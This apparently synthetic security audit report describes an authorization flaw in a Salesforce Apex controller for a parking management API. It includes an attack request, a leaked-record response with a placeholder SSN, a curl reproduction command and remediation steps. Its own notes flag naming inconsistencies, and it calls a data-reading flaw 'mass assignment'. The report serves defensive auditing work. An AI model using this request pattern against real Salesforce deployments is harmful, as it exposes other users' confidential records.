# Security Analysis Report
**System:** ParkIQ Management API (Salesforce-Integrated)
**Domain:** Parking / Smart City
**Example ID:** SF-0100
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.12 | Mass assignment via object fields on `ContactController.updateContact` — attacker reads any parking management Contact record including all custom fields |

---

## Finding 1 — BOLA: Mass Assignment via Object Fields on Contact Object (Pattern 1.12)

### Summary
The Apex controller `ContactController` on ParkIQ Management API (`3fe7eeb8.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Contact object. Per §5.0 Pattern 1.12, the client-supplied `fields` array allows mass-reading all custom object attributes without server-side field restriction, and the `without sharing` declaration means Salesforce sharing rules are silently bypassed.

**Context.txt inconsistency (documented):** The Apex method in §4.0 is `getContactDetails(String contactId, ...)` but the Aura descriptor in §6.0 is `c.ContactController.updateContact`. These names conflict. The HAR (§6.0) is the primary evidence — this analysis follows the HAR.

**Pattern:** 1.12 — Mass assignment via object fields (BOLA)
**Affected controller:** `c.ContactController.updateContact`
**Affected endpoint:** `POST https://3fe7eeb8.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://3fe7eeb8.lightning.force.com/aura
Authorization: Bearer 00D3FE7EEB8!AR3fe7eeb8...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D3FE7EEB8!AR3fe7eeb8...

message={"actions":[{"id":"1;a","descriptor":"c.ContactController.updateContact","callingDescriptor":"UNKNOWN",
"params":{"contactId":"001EEB8","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Contact Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "001EEB8", "Name": "Victim Contact Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-41-6707"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00D3FE7EEB8!AR3fe7eeb8..."
curl -s -X POST "https://3fe7eeb8.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.ContactController.updateContact","callingDescriptor":"UNKNOWN","params":{"contactId":"001EEB8","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-41-6707
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class ContactController { ... }`
2. `WHERE Id = :contactId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist (prevent mass-read of all custom fields). Validate `aura.token`.
